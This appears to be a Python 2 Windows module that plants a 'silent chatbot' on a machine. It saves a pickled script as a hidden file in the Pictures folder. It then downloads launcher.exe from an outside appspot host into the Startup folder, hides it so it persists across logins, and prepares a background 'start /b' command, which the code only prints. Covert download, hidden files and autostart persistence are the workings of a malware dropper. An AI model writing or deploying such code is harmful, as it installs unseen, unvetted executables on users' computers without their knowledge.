"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""

import cPickle
import os
import threading
import urllib2
import win32api
import win32con

from win32com.shell import shell, shellcon

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        print self.script
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
        unhide_file(path)
        f = open(path, "w")
        print path
        #Save the script
        cPickle.dump(self.script, f)
        print cPickle.dumps(self.script)
        #Hide the script
        f.close()
        hide_file(path)
        
        #Get a path for the launcher
        path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
        unhide_file(path)
        #Save the launcher
        url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
        try:
            win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_NORMAL)
        except:
            pass
        f = open(path, "w")
        f.write(url.read())
        f.close()
        url.close()
        print path
        #Hide the launcher
        hide_file(path)
        
        #Run the launcher
        command = "start /b %s"%win32api.GetShortPathName(path)
        print command
        
#Utility functions.  May be useful elsewhere
def file_in_special_path(specialpath, fname):
    """Make a path composed of a special (CSIDL) path and a file name.
    
    @param specialpath: The CSIDL path found in shellcon
    @param fname: the name of the file
    """
    path = shell.SHGetFolderPath(0, specialpath, None, 0)
    print "One: " + path
    path = os.path.join(path, fname)
    print "Two: " + path
    return path

def hide_file(path):
    """Hide a file.
    
    First tries to open it (to make it exist), then tries to hide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_HIDDEN)
    
def unhide_file(path):
    """Unhide a file.
    
    First tries to open it (to make it exist), then tries to unhide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_NORMAL)
        
def __file_setstate(path, state):
    try:
        f = open(path, "r+")
        f.close()
    except:
        pass
    try:
        win32api.SetFileAttributes(path,state)
    except:
        pass
